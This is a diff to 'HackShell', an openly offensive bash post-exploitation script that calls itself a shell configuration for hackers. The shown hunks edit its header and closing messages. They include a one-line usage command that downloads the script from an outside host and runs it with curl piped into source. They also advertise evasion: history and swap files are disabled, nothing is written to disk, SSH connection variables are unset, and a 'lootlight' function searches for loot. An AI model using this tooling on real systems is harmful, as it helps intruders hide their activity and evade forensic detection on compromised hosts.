@@ -2,17 +2,18 @@
 
 # HackShell - Post-Login shell configuration for hackers
 #
-# Configure the current shell to not create any files on the
-# file system and set up some useful commands. Optionally download
-# useful static binaries.
+# Configures the current BASH shell to disable history files and swap files
+# for bash, wget, less, vim, mysql, curl, ...
 #
-# Usage (memory only):
+# Also adds many useful commands, aliases and bash functions.
+#
+# Does not write anything to the file-system and remains as silent as possible.
+#
+# Usage:
 #     source <(curl -SsfL https://thc.org/hs)
-# Usage with downloading binaries:
-#     BIN=1 source <(curl -SsfL https://thc.org/hs)
 #
-# Environment variables:
-#    XHOME=         Set custom XHOME directory instead of /dev/shm/.$'\t''~?$:?'
+# Environment variables (optional):
+#    XHOME=         Set custom XHOME directory [default: /dev/shm/.$'\t''~?$:?']
 #
 # https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/hackshell.sh
 # 2024 by theM0ntarCann0n & skpr
@@ -865,18 +866,14 @@ hs_init_shell
 xhelp
 
 ### Finishing
-str=""
-[ -z "$BIN" ] && {
-    echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
-    str="No data was written to the filesystem"
-}
+echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
 echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
 echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
-echo -e ">>> ${CG}Setup complete. ${CF}${str}${CN}"
+echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"
 
 ### Check for obvious loots
 lootlight
 
 # unset all functions that are no longer needed.
 unset -f hs_init hs_init_alias hs_init_dl hs_init_shell
-unset BIN str SSH_CONNECTION SSH_CLIENT
+unset SSH_CONNECTION SSH_CLIENT
